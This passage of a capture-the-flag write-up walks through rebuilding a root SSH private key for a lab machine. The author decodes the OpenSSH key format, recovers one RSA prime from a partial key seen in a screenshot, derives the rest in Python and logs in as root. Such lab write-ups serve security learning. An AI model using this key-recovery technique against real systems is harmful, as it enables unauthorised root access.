> ;; either "bcrypt" or "none"
> string   kdfname
>
> ;; kdfoptions field.
> ;; This one is actually a buffer with size determined by the
> ;; uint32 value, which preceeds it.
> ;; If no encryption was used to protect the private key,
> ;; it's contents will be the [0x00 0x00 0x00 0x00] bytes (empty string).
> ;; You should read the embedded buffer, only if it's size is
> ;; different than 0.
> uint32 (size of buffer)
>     string salt
>     uint32 rounds
>
> ;; Number of keys embedded within the blob.
> ;; This value is always set to 1, at least in the
> ;; current implementation of the private key format.
> uint32 number-of-keys
>
> ;; Public key section.
> ;; This one is a buffer, in which the public key is embedded.
> ;; Size of the buffer is determined by the uint32 value,
> ;; which preceeds it.
> ;; The public components below are for RSA public keys.
> uint32 (size of buffer)
>     string keytype ("ssh-rsa")
>     mpint  e       (RSA public exponent)
>     mpint  n       (RSA modulus)
>
> ;; Encrypted section
> ;; This one is a again a buffer with size
> ;; specified by the uint32 value, which preceeds it.
> ;; The fields below are for RSA private keys.
> uint32 (size of buffer)
>     uint32  check-int
>     uint32  check-int  (must match with previous check-int value)
>     string  keytype    ("ssh-rsa")
>     mpint   n          (RSA modulus)
>     mpint   e          (RSA public exponent)
>     mpint   d          (RSA private exponent)
>     mpint   iqmp       (RSA Inverse of Q Mod P, a.k.a iqmp)
>     mpint   p          (RSA prime 1)
>     mpint   q          (RSA prime 2)
>     string  comment    (Comment associated with the key)
>     byte[n] padding    (Padding according to the rules above)
>
> ```

There’s a lot more here! The private key includes the public key, as well as `d`, `p`, `q`.

#### Recover Key

I’m going to assume the public key in the `authorized_keys` file is paired with the partial private key from the screen shot. Since I only have part of the private key, I’ll start with the public key:

```

oxdf@hacky$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCeOiz7uVJa1/Gy6pepA68bT2nlM2E6eNVRLpoIlNyRepQk6N7TkBSynQShoZesByJ2g3pTiWXZIraP80upKb1FvvLT7bWIH7YrzBHvtjAIryuh35Z5i/rwadQUApodPSz+wMYQaYm3ZlRJBz8UlkoSOPC9fUVrrMoRUIjufm34wpBNtzxt7fcbEZXzvjfXjov5tkKgOR9n+YkClqt2ZOs+zNyQOepzWFpdW2F88N2b5lm9325weJMw9MGBlHJ4y25o1th7r94qAegFCIuaE4/LXjHyXYNFzIYbp7yYKcEFnz8JrRoFeAd7uhqQJi+ZHiPRfSAIxa/vQOZAN5kLyhSP7Cvgpdw8EaWUgxZOhJ7Us4VuZrJfR73TuyUHwkAFLUZT8ErovTbOIpSFlw1gfhNOUO78wgc78neLKq5qo88MRgdS9BkIkc54nB4dCZHSqrrnDhzGG8MNEhGHiCW2NUPjeZ2D8vHnGn+XIQhy3BLDPWKR5o4F1vCL6AX/ouf1SVE= root@response

```

I’m interested in the base64-blob, so I’ll use `cut -d' ' -f2` to get that, and base64 decode it to get:

![image-20230203140031021](https://0xdfimages.gitlab.io/img/image-20230203140031021.png)

I’ve highlighted the three length-value pairs here:
- Key format [orange] - 7 bytes, “ssh-rsa”
- `e` [blue] - 3 bytes, 0x010001
- `n` [yellow] - 0x181 bytes, large int

I can take the long hex strings into something like Python and get ints, or just use [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) with `--dumpkey` and `--publickey` to dump the values from the key:

```

oxdf@hacky$ python RsaCtfTool.py --publickey authorized_keys --dumpkey
private argument is not set, the private key will not be displayed, even if recovered.
Details for /home/oxdf/hackthebox/response-10.10.11.163/Documents/authorized_keys:
n: 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217
e: 65537

```

Turning to the private key, I’ll first need to get the text from the screenshot. I had limited success with OCR, and ended up typing most if it in by hand:

```

ntEd3KnWNpkbwp28vVgasUOq3CQBbDOQAAAMEAxwsaGXCZwMb/JH88XvGhu1Bo2zomIhaV
MrbN5x4q3c7Z0u9gmkXO+NWMpX7T20l0OBEIhrW6DQOsxis/CrS5u69F6tUZjlUdNE1zIE
7IFv2QurMwNL89/SnlQbe24xb+IjafKUaOPsNcpFakP4vxnKL+uw6qFoqRdSZyndgArZKD
K26Z7ZzdV2ln2kyiLfokN8WbYxHeQ/7/jVBXf71BU1+Xg8X44njVp3Xf9gO6cYVaqb1xBs
Z7bG8Warkycj7ZAAAADXJvb3RAcmVzcG9uc2UBAgMEBQ==

```

I’ll send this into `base64 -d` and it prints output, but also says invalid input:

```

oxdf@hacky$ echo "ntEd3KnWNpkbwp28vVgasUOq3CQBbDOQAAAMEAxwsaGXCZwMb/JH88XvGhu1Bo2zomIhaV
> MrbN5x4q3c7Z0u9gmkXO+NWMpX7T20l0OBEIhrW6DQOsxis/CrS5u69F6tUZjlUdNE1zIE
> 7IFv2QurMwNL89/SnlQbe24xb+IjafKUaOPsNcpFakP4vxnKL+uw6qFoqRdSZyndgArZKD
> K26Z7ZzdV2ln2kyiLfokN8WbYxHeQ/7/jVBXf71BU1+Xg8X44njVp3Xf9gO6cYVaqb1xBs
> Z7bG8Warkycj7ZAAAADXJvb3RAcmVzcG9uc2UBAgMEBQ==" | base64 -d | xxd
base64: invalid input
00000000: 9ed1 1ddc a9d6 3699 1bc2 9dbc bd58 1ab1  ......6......X..
00000010: 43aa dc24 016c 3390 0000 0c10 0c70 b1a1  C..$.l3......p..
00000020: 9709 9c0c 6ff2 47f3 c5ef 1a1b b506 8db3  ....o.G.........
00000030: a262 2169 532b 6cde 71e2 addc ed9d 2ef6  .b!iS+l.q.......
00000040: 09a4 5cef 8d58 ca57 ed3d b497 4381 1088  ..\..X.W.=..C...
00000050: 6b5b a0d0 3acc 62b3 f0ab 4b9b baf4 5ead  k[..:.b...K...^.
00000060: 5198 e551 d344 d732 04ec 816f d90b ab33  Q..Q.D.2...o...3
00000070: 034b f3df d29e 541b 7b6e 316f e223 69f2  .K....T.{n1o.#i.
00000080: 9468 e3ec 35ca 456a 43f8 bf19 ca2f ebb0  .h..5.EjC..../..
00000090: eaa1 68a9 1752 6729 dd80 0ad9 2832 b6e9  ..h..Rg)....(2..
000000a0: 9ed9 cdd5 7696 7da4 ca22 dfa2 437c 59b6  ....v.}.."..C|Y.
000000b0: 311d e43f eff8 d505 77fb d415 35f9 783c  1..?....w...5.x<
000000c0: 5f8e 278d 5a77 5dff 603b a718 55aa 9bd7  _.'.Zw].`;..U...
000000d0: 106c 67b6 c6f1 66ab 9327 23ed 9000 0000  .lg...f..'#.....
000000e0: d726 f6f7 4407 2657 3706 f6e7 3650 1020  .&..D.&W7...6P. 
000000f0: 3040 50                                  0@P

```

That’s because it’s cut on a byte boundary, which will make all of the data that follows wrong. Base64 encoding takes three bytes and outputs four characters. So if I start in the middle of one of those four character blocks, it will be wrong. I can fill the start with `A` until that is fixed. Each `A` is adding six null *bits* to the front. After two `A`s, there’s no error any more:

```

oxdf@hacky$ echo "AAntEd3KnWNpkbwp28vVgasUOq3CQBbDOQAAAMEAxwsaGXCZwMb/JH88XvGhu1Bo2zomIhaVMrbN5x4q3c7Z0u9gmkXO+NWMpX7T20l0OBEIhrW6DQOsxis/CrS5u69F6tUZjlUdNE1zIE7IFv2QurMwNL89/SnlQbe24xb+IjafKUaOPsNcpFakP4vxnKL+uw6qFoqRdSZyndgArZKDK26Z7ZzdV2ln2kyiLfokN8WbYxHeQ/7/jVBXf71BU1+Xg8X44njVp3Xf9gO6cYVaqb1xBsZ7bG8Warkycj7ZAAAADXJvb3RAcmVzcG9uc2UBAgMEBQ==" | base64 -d | xxd
00000000: 0009 ed11 ddca 9d63 6991 bc29 dbcb d581  .......ci..)....
00000010: ab14 3aad c240 16c3 3900 0000 c100 c70b  ..:..@..9.......
00000020: 1a19 7099 c0c6 ff24 7f3c 5ef1 a1bb 5068  ..p....$.<^...Ph
00000030: db3a 2622 1695 32b6 cde7 1e2a ddce d9d2  .:&"..2....*....
00000040: ef60 9a45 cef8 d58c a57e d3db 4974 3811  .`.E.....~..It8.
00000050: 0886 b5ba 0d03 acc6 2b3f 0ab4 b9bb af45  ........+?.....E
00000060: ead5 198e 551d 344d 7320 4ec8 16fd 90ba  ....U.4Ms N.....
00000070: b330 34bf 3dfd 29e5 41b7 b6e3 16fe 2236  .04.=.).A....."6
00000080: 9f29 468e 3ec3 5ca4 56a4 3f8b f19c a2fe  .)F.>.\.V.?.....
00000090: bb0e aa16 8a91 7526 729d d800 ad92 832b  ......u&r......+
000000a0: 6e99 ed9c dd57 6967 da4c a22d fa24 37c5  n....Wig.L.-.$7.
000000b0: 9b63 11de 43fe ff8d 5057 7fbd 4153 5f97  .c..C...PW..AS_.
000000c0: 83c5 f8e2 78d5 a775 dff6 03ba 7185 5aa9  ....x..u....q.Z.
000000d0: bd71 06c6 7b6c 6f16 6ab9 3272 3ed9 0000  .q..{lo.j.2r>...
000000e0: 000d 726f 6f74 4072 6573 706f 6e73 6501  ..root@response.
000000f0: 0203 0405

```

I’ll note that the first 12 bits are ones added by me, so those three hex 0s. I’ll scan the output for four-btye blocks that look like they could be lengths. If something is a length, then the next length should be that many bytes after. There are two in this:

![image-20230203141743926](https://0xdfimages.gitlab.io/img/image-20230203141743926.png)

I’ve highlighted in four colors:
- End of `p` [purple] - 000 isn’t a part because I added that, no info about size before
- `q` [red] - 0xc1 bytes, large int
- Comment [green] - 0xd bytes, “root@response”, matches public comment.
- Padding [tan]

The only value I get from this is `q`, but that’s all I need. I like to do the calcs in a Python shell, starting with the three values I have recovered:

```

>>> n = 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217
>>> e = 0x10001
>>> q = int('c70b1a197099c0c6ff247f3c5ef1a1bb5068db3a2622169532b6cde71e2addced9d2ef609a45cef8d58ca57ed3db497438110886b5ba0d03acc62b3f0ab4b9bbaf45ead5198e551d344d73204ec816fd90bab33034bf3dfd29e541b7b6e316fe22369f29468e3ec35ca456a43f8bf19ca2febb0eaa168a917526729dd800ad92832b6e99ed9cdd576967da4ca22dfa2437c59b6311de43feff8d50577fbd41535f9783c5f8e278d5a775dff603ba71855aa9bd7106c67b6c6f166ab932723ed9', 16)

```

With `n` and `q` I can calculate `p`:

```

>>> p = n//q
>>> p*q == n
True

```

With that, I’ll calculate φ:

```

>>> phi = (p-1)*(q-1)

```

And then `d`:

```

>>> d = pow(e, -1, phi)

```

This is all I need for the private key. There are many ways to build this back into a private key I can use to SSH. I’ll use RsaCtfTool again, this time passing `--private` to output the private key, and `-n`, `-p`, `-q`, and `-e` with their values. It will do the rest from there:

```

oxdf@hacky$ python RsaCtfTool.py --private -n 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091
7627071299555244134365867171826083247633002826751788948299820571126272952544932870980026796396698201500594402300264633335556896674649332044400207064077136354156383015096110289280803680977176
4623939671584556365572738170720499197141419723217103310930894270644879329081036621196914714266359087623590255742796733834781631760746831901365823274647564435850453490312773218298196577201668
2335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226
8506666672782867197781791203157149737399461911203428058352859165726249183867942404406904177938160967525045564123069804199757863794162002637869524727980451960587624770565258709726950216043379
04447201141677747670148003857478011217 -p 1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917
8637604547050517453115893689666397232567909954657863498030857676464923273585291929569981402472301413240834335478423374165624121680694677805294089806115209514881075555039407735834484342123449
44450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681 -q 1874049613140184843621060844430875438039715136676390587014490
6426676483488347295786705722187706750176719551659095103726802312279977947978137832518550344993180603834666327975548950894032567422418697184833084580551659371681050259706184171127006823325387
4333354847139532784807791789514408734683275560740057340668852771769638615510384019832973056904388461333972034694245679846486529851151424084935059703498856185063157478181192537663762674394776
8533920575522310602457 -e 65537

Results for /tmp/tmpf7dt7gdc:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIG5AIBAAKCAYEAnjos+7lSWtfxsuqXqQOvG09p5TNhOnjVUS6aCJTckXqUJOje
05AUsp0EoaGXrAcidoN6U4ll2SK2j/NLqSm9Rb7y0+21iB+2K8wR77YwCK8rod+W
...[snip]...

```

#### Shell

With that key, I can connect as root:

```

oxdf@hacky$ vim ~/keys/response-root
oxdf@hacky$ chmod 600 ~/keys/response-root
oxdf@hacky$ ssh -i ~/keys/response-root root@response.htb
...[snip]...
root@response:~#

```

And get the root flag:

```

root@response:~# cat root.txt
580a29d7************************

```